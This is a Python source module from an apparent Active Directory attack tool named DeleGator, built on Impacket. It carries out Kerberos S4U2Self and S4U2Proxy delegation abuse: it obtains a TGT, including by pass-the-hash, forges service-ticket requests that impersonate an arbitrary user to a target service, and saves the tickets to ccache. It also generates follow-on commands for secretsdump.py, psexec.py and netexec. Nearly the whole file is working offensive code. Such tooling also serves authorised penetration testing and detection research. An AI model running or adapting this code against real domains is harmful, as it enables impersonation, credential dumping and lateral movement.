"""
core/kerberos.py

Kerberos ticket operations for DeleGator.
Compatible with Impacket 0.13.x.

S4U2Self and S4U2Proxy implemented following the reference in
Impacket's getST.py, building raw TGS-REQ structures with the
correct PA-FOR-USER padata and KDC option flags.
"""

import os
import sys
import datetime
import random
import struct
from typing import Optional
from dataclasses import dataclass

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import (
    getKerberosTGT,
    getKerberosTGS,
    sendReceive,
    KerberosError,
)
from impacket.krb5.asn1 import (
    TGS_REQ, TGS_REP, AS_REP,
    AP_REQ, Authenticator,
    seq_set, seq_set_iter,
    PA_FOR_USER_ENC, PA_PAC_OPTIONS,
    Ticket as TicketAsn1,
    EncTGSRepPart,
)
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5 import constants
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5

rand = random.SystemRandom()


# ---------------------------------------------------------------------------
# TicketResult
# ---------------------------------------------------------------------------

@dataclass
class TicketResult:
    """Encapsulates a Kerberos ticket and associated metadata."""
    ticket:           bytes
    session_key:      object   # new session key from the ticket (enc-part key)
    client:           str
    target_spn:       str
    domain:           str
    ccache_path:      Optional[str] = None
    tgt_session_key:  object = None  # TGT session key used to encrypt TGS-REP enc-part

    @property
    def export_command(self) -> str:
        if self.ccache_path:
            return f"export KRB5CCNAME={self.ccache_path}"
        return "# Run write_ccache() first to save the ticket"

    @property
    def netexec_command(self) -> str:
        host     = self.target_spn.split("/")[-1].split(":")[0]
        service  = self.target_spn.split("/")[0].upper()
        protocol = _spn_to_netexec_protocol(service)
        return f"netexec {protocol} {host} --use-kcache"

    @property
    def impacket_command(self) -> str:
        host    = self.target_spn.split("/")[-1].split(":")[0]
        service = self.target_spn.split("/")[0].upper()
        user    = self.client.split("@")[0]
        if "MSSQL" in service:
            return f"mssqlclient.py -k -no-pass {user}@{host}"
        if "CIFS" in service or "SMB" in service:
            return f"secretsdump.py -k -no-pass {user}@{host}"
        if "HTTP" in service:
            return "# Use curl with --negotiate for HTTP Kerberos auth"
        return f"psexec.py -k -no-pass {user}@{host}"


def _spn_to_netexec_protocol(service: str) -> str:
    mapping = {
        "CIFS": "smb", "SMB": "smb",
        "MSSQLSVC": "mssql",
        "HTTP": "http",
        "LDAP": "ldap",
        "WSMAN": "winrm",
    }
    for key, proto in mapping.items():
        if key in service.upper():
            return proto
    return "smb"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _die(message: str) -> None:
    print(f"\n  [!] Kerberos error: {message}\n", file=sys.stderr)
    sys.exit(1)


def _build_ccache_path(user: str, spn: str, output_dir: str = "/tmp") -> str:
    spn_clean  = spn.replace("/", "_").replace(":", "_").lower()
    user_clean = user.lower().replace("@", "_").replace(".", "_")
    ts         = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    return os.path.join(output_dir, f"{user_clean}_{spn_clean}_{ts}.ccache")


def _get_tgt_from_auth(auth, dc_ip: str) -> tuple:
    """
    Return (tgt_bytes, cipher, old_session_key, session_key).
    For ccache auth loads directly — no AS-REQ generated.
    """
    from .auth import AuthMethod

    domain   = auth.domain.upper()
    username = auth.username

    if auth.auth_method == AuthMethod.CCACHE:
        return _load_tgt_from_ccache(auth.ccache_path, username, domain)

    client_name = Principal(
        username,
        type=constants.PrincipalNameType.NT_PRINCIPAL.value
    )

    if auth.auth_method == AuthMethod.PASSWORD:
        try:
            return getKerberosTGT(
                clientName=client_name,
                password=auth.password,
                domain=domain,
                lmhash=b"",
                nthash=b"",
                aesKey="",
                kdcHost=dc_ip,
            )
        except KerberosError as e:
            _die(f"AS-REQ failed for {auth.upn}: {e}")

    elif auth.auth_method == AuthMethod.HASH:
        import binascii
        lm = binascii.unhexlify(auth.lm_hash)
        nt = binascii.unhexlify(auth.nt_hash)
        try:
            return getKerberosTGT(
                clientName=client_name,
                password="",
                domain=domain,
                lmhash=lm,
                nthash=nt,
                aesKey="",
                kdcHost=dc_ip,
            )
        except KerberosError as e:
            _die(f"AS-REQ (pass-the-hash) failed for {auth.upn}: {e}")

    _die(f"Unsupported auth method for TGT acquisition: {auth.auth_method.name}")


def _load_tgt_from_ccache(ccache_path: str, username: str, domain: str) -> tuple:
    """Load TGT from existing ccache — no KDC interaction."""
    try:
        ccache = CCache.loadFile(ccache_path)
    except Exception as e:
        _die(f"Cannot load ccache '{ccache_path}': {e}")

    tgt_cred = None
    for cred in ccache.credentials:
        try:
            server = cred["server"].prettyPrint()
            if "krbtgt" in server.lower():
                tgt_cred = cred
                break
        except Exception:
            continue

    if tgt_cred is None and ccache.credentials:
        tgt_cred = ccache.credentials[0]

    if tgt_cred is None:
        _die(f"No usable credential found in ccache '{ccache_path}'.")

    tgt_raw  = tgt_cred.toTGT()["KDC_REP"]
    keytype  = int(tgt_cred["key"]["keytype"])
    keyvalue = tgt_cred["key"]["keyvalue"]
    cipher   = _enctype_table[keytype]
    key      = Key(keytype, keyvalue)

    return tgt_raw, cipher, key, key


def _build_ap_req(decoded_tgt, cipher, session_key) -> bytes:
    """Build an AP-REQ from a decoded TGT for inclusion in TGS-REQ padata."""
    tgt_ticket = Ticket()
    tgt_ticket.from_asn1(decoded_tgt["ticket"])

    ap_req = AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    ap_req["ap-options"] = constants.encodeFlags([])
    seq_set(ap_req, "ticket", tgt_ticket.to_asn1)

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = str(decoded_tgt["crealm"])

    client_name = Principal()
    client_name.from_asn1(decoded_tgt, "crealm", "cname")
    seq_set(authenticator, "cname", client_name.components_to_asn1)

    now = datetime.datetime.now(datetime.timezone.utc)
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)

    encoded_auth    = encoder.encode(authenticator)
    enc_auth        = cipher.encrypt(session_key, 7, encoded_auth, None)

    ap_req["authenticator"] = noValue
    ap_req["authenticator"]["etype"]  = cipher.enctype
    ap_req["authenticator"]["cipher"] = enc_auth

    return encoder.encode(ap_req)


def _decode_tgs_rep(r: bytes, session_key) -> tuple:
    """Decode a TGS-REP and return (tgs, new_cipher, new_session_key)."""
    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
    cipher2    = _enctype_table[int(tgs["enc-part"]["etype"])]
    plain_text = cipher2.decrypt(session_key, 8, tgs["enc-part"]["cipher"].asOctets())
    enc_rep    = decoder.decode(plain_text, asn1Spec=EncTGSRepPart())[0]
    new_key    = Key(
        int(enc_rep["key"]["keytype"]),
        enc_rep["key"]["keyvalue"]
    )
    return tgs, cipher2, new_key


# ---------------------------------------------------------------------------
# S4U2Self
# ---------------------------------------------------------------------------

def s4u2self(
    auth,
    dc_ip:       str,
    impersonate: str,
    spn:         str,
    output_dir:  str = "/tmp",
) -> TicketResult:
    """
    Perform S4U2Self — request a service ticket for ourselves
    on behalf of the impersonated user.

    Follows the PA-FOR-USER construction from Impacket getST.py:
      S4UByteArray = pack('<I', NT_PRINCIPAL) + username + realm + 'Kerberos'
      checksum = HMAC-MD5(session_key, usage=17, S4UByteArray)

    Generates: Event ID 4769 on the DC.
    """
    domain = auth.domain.upper()
    tgt, cipher, old_session_key, session_key = _get_tgt_from_auth(auth, dc_ip)

    try:
        decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    except Exception:
        decoded_tgt = decoder.decode(tgt, asn1Spec=TGS_REP())[0]

    encoded_ap_req = _build_ap_req(decoded_tgt, cipher, session_key)

    # Build PA-FOR-USER following MS-SFU 2.2.1 spec exactly
    # S4UByteArray = NT_PRINCIPAL (little-endian uint32) + username + realm + "Kerberos"
    # All as raw bytes (not UTF-16LE)
    S4UByteArray = (
        struct.pack("<I", constants.PrincipalNameType.NT_PRINCIPAL.value) +
        impersonate.encode() +
        domain.encode() +
        b"Kerberos"
    )

    checksum = _HMACMD5.checksum(session_key, 17, S4UByteArray)

    impersonate_principal = Principal(
        impersonate,
        type=constants.PrincipalNameType.NT_PRINCIPAL.value
    )

    pa_for_user = PA_FOR_USER_ENC()
    seq_set(pa_for_user, "userName", impersonate_principal.components_to_asn1)
    pa_for_user["userRealm"] = domain
    pa_for_user["cksum"] = noValue
    pa_for_user["cksum"]["cksumtype"] = int(constants.ChecksumTypes.hmac_md5.value)
    pa_for_user["cksum"]["checksum"]  = checksum
    pa_for_user["auth-package"] = "Kerberos"

    encoded_pa_for_user = encoder.encode(pa_for_user)

    # Build TGS-REQ
    tgs_req = TGS_REQ()
    tgs_req["pvno"] = 5
    tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgs_req["padata"] = noValue
    tgs_req["padata"][0] = noValue
    tgs_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
    )
    tgs_req["padata"][0]["padata-value"] = encoded_ap_req

    tgs_req["padata"][1] = noValue
    tgs_req["padata"][1]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_FOR_USER.value
    )
    tgs_req["padata"][1]["padata-value"] = encoded_pa_for_user

    req_body = seq_set(tgs_req, "req-body")

    opts = [
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.canonicalize.value,
    ]
    req_body["kdc-options"] = constants.encodeFlags(opts)

    # sname: the service account itself — use NT_UNKNOWN with just the username
    # (matches getST.py behaviour exactly)
    server_name = Principal(
        auth.username,
        type=constants.PrincipalNameType.NT_UNKNOWN.value
    )
    seq_set(req_body, "sname", server_name.components_to_asn1)
    req_body["realm"] = str(decoded_tgt["crealm"])

    now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
    req_body["till"]  = KerberosTime.to_asn1(now)
    req_body["nonce"] = rand.getrandbits(31)
    seq_set_iter(req_body, "etype", (
        int(cipher.enctype),
        int(constants.EncryptionTypes.rc4_hmac.value),
    ))

    message = encoder.encode(tgs_req)

    try:
        r = sendReceive(message, domain, dc_ip)
    except KerberosError as e:
        _die(
            f"S4U2Self failed for '{auth.username}' impersonating '{impersonate}': {e}\n"
            "  Verify TRUSTED_TO_AUTH_FOR_DELEGATION is set on the account\n"
            "  and the SPN is correctly registered."
        )

    tgs, cipher2, new_key = _decode_tgs_rep(r, session_key)

    return TicketResult(
        ticket=r,
        session_key=new_key,
        client=f"{impersonate}@{domain}",
        target_spn=spn,
        domain=domain,
        tgt_session_key=session_key,
    )


# ---------------------------------------------------------------------------
# S4U2Proxy
# ---------------------------------------------------------------------------

def s4u2proxy(
    auth,
    dc_ip:             str,
    impersonate:       str,
    target_spn:        str,
    s4u2self_ticket:   bytes,
    s4u2self_key:      object,
    output_dir:        str = "/tmp",
) -> TicketResult:
    """
    Perform S4U2Proxy using the S4U2Self ticket to request a ticket
    for the target SPN.

    Uses cname_in_addl_tkt KDC option and PA-PAC-OPTIONS padata
    following getST.py reference implementation.

    Generates: Event ID 4769 on the DC.
    """
    domain = auth.domain.upper()
    tgt, cipher, old_session_key, session_key = _get_tgt_from_auth(auth, dc_ip)

    try:
        decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    except Exception:
        decoded_tgt = decoder.decode(tgt, asn1Spec=TGS_REP())[0]

    # Decode S4U2Self ticket to extract inner ticket for additionalTickets
    # Handle both full TGS_REP envelope and raw Ticket bytes
    inner_ticket = Ticket()
    try:
        decoded_s4u = decoder.decode(s4u2self_ticket, asn1Spec=TGS_REP())[0]
        inner_ticket.from_asn1(decoded_s4u["ticket"])
    except Exception:
        try:
            from impacket.krb5.asn1 import Ticket as TicketAsn1Spec
            raw_asn1 = decoder.decode(s4u2self_ticket, asn1Spec=TicketAsn1Spec())[0]
            inner_ticket.from_asn1(raw_asn1)
        except Exception as e:
            _die(f"Cannot decode S4U2Self ticket for S4U2Proxy: {e}")

    encoded_ap_req = _build_ap_req(decoded_tgt, cipher, session_key)

    # PA-PAC-OPTIONS with resource_based_constrained_delegation flag
    pa_pac_options = PA_PAC_OPTIONS()
    pa_pac_options["flags"] = constants.encodeFlags((
        constants.PAPacOptions.resource_based_constrained_delegation.value,
    ))

    # Build TGS-REQ
    tgs_req = TGS_REQ()
    tgs_req["pvno"] = 5
    tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgs_req["padata"] = noValue
    tgs_req["padata"][0] = noValue
    tgs_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
    )
    tgs_req["padata"][0]["padata-value"] = encoded_ap_req

    tgs_req["padata"][1] = noValue
    tgs_req["padata"][1]["padata-type"] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
    tgs_req["padata"][1]["padata-value"] = encoder.encode(pa_pac_options)

    req_body = seq_set(tgs_req, "req-body")

    # cname_in_addl_tkt is the S4U2Proxy signal to the KDC
    opts = [
        constants.KDCOptions.cname_in_addl_tkt.value,
        constants.KDCOptions.canonicalize.value,
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
    ]
    req_body["kdc-options"] = constants.encodeFlags(opts)

    target_principal = Principal(
        target_spn,
        type=constants.PrincipalNameType.NT_SRV_INST.value
    )
    seq_set(req_body, "sname", target_principal.components_to_asn1)
    req_body["realm"] = domain

    # additionalTickets — the S4U2Self ticket
    my_ticket = inner_ticket.to_asn1(TicketAsn1())
    seq_set_iter(req_body, "additional-tickets", (my_ticket,))

    now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
    req_body["till"]  = KerberosTime.to_asn1(now)
    req_body["nonce"] = rand.getrandbits(31)
    seq_set_iter(req_body, "etype", (
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
        int(constants.EncryptionTypes.des_cbc_md5.value),
        int(cipher.enctype),
    ))

    message = encoder.encode(tgs_req)

    try:
        r = sendReceive(message, domain, dc_ip)
    except KerberosError as e:
        _die(
            f"S4U2Proxy failed targeting '{target_spn}' "
            f"impersonating '{impersonate}': {e}\n"
            "  Verify the SPN is in msDS-AllowedToDelegateTo list."
        )

    tgs, cipher2, new_key = _decode_tgs_rep(r, session_key)

    return TicketResult(
        ticket=r,
        session_key=new_key,
        client=f"{impersonate}@{domain}",
        target_spn=target_spn,
        domain=domain,
        tgt_session_key=session_key,
    )


# ---------------------------------------------------------------------------
# ccache I/O
# ---------------------------------------------------------------------------

def write_ccache(
    result:     TicketResult,
    output_dir: str = "/tmp",
    filename:   Optional[str] = None,
) -> str:
    """Write a TicketResult to a ccache file and update result.ccache_path."""
    if filename:
        ccache_path = os.path.join(output_dir, filename)
    else:
        ccache_path = _build_ccache_path(
            result.client.split("@")[0],
            result.target_spn,
            output_dir,
        )

    # fromTGS(tgs_bytes, oldSessionKey, sessionKey)
    # oldSessionKey = TGT session key used to encrypt the TGS-REP enc-part
    # sessionKey    = new session key extracted from the decrypted enc-part
    # If tgt_session_key is not set fall back to session_key (best effort)
    old_key = result.tgt_session_key if result.tgt_session_key is not None else result.session_key
    ccache = CCache()
    ccache.fromTGS(result.ticket, old_key, result.session_key)
    ccache.saveFile(ccache_path)

    result.ccache_path = ccache_path
    return ccache_path


def get_tgt(auth, dc_ip: str, output_dir: str = "/tmp") -> str:
    """Obtain a TGT and write it to ccache. Returns the ccache path."""
    from .auth import AuthMethod
    if auth.auth_method == AuthMethod.CCACHE:
        return auth.ccache_path

    tgt, cipher, old_key, session_key = _get_tgt_from_auth(auth, dc_ip)
    domain = auth.domain.upper()
    spn    = f"krbtgt/{domain}"
    path   = _build_ccache_path(auth.username, spn, output_dir)

    ccache = CCache()
    ccache.fromTGT(tgt, old_key, session_key)
    ccache.saveFile(path)

    return path


# ---------------------------------------------------------------------------
# Full S4U chain
# ---------------------------------------------------------------------------

def full_s4u_chain(
    auth,
    dc_ip:       str,
    impersonate: str,
    service_spn: str,
    target_spn:  str,
    output_dir:  str = "/tmp",
) -> TicketResult:
    """
    Execute the complete S4U2Self → S4U2Proxy chain and write ccache.
    Returns TicketResult with ccache_path populated.
    """
    self_result = s4u2self(
        auth=auth,
        dc_ip=dc_ip,
        impersonate=impersonate,
        spn=service_spn,
        output_dir=output_dir,
    )

    proxy_result = s4u2proxy(
        auth=auth,
        dc_ip=dc_ip,
        impersonate=impersonate,
        target_spn=target_spn,
        s4u2self_ticket=self_result.ticket,
        s4u2self_key=self_result.session_key,
        output_dir=output_dir,
    )

    write_ccache(proxy_result, output_dir)
    return proxy_result
